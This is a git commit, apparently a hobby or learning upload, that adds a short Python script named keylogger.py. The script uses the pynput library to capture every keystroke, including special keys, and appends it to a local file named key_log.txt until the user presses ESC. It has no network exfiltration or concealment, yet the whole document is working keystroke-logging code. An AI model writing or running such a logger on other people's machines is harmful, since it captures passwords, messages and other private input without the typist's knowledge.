59d44c7c6dfefd90c0e5ee8d4f50aab8bccd935d
Aishwarya <147327064+bubitsaashi@users.noreply.github.com>
2025-09-12 22:46:55 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,21 @@
+from pynput import keyboard
+
+# File where keystrokes will be saved
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def on_release(key):
+    # Stop logging if user presses ESC
+    if key == keyboard.Key.esc:
+        return False
+
+# Start the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
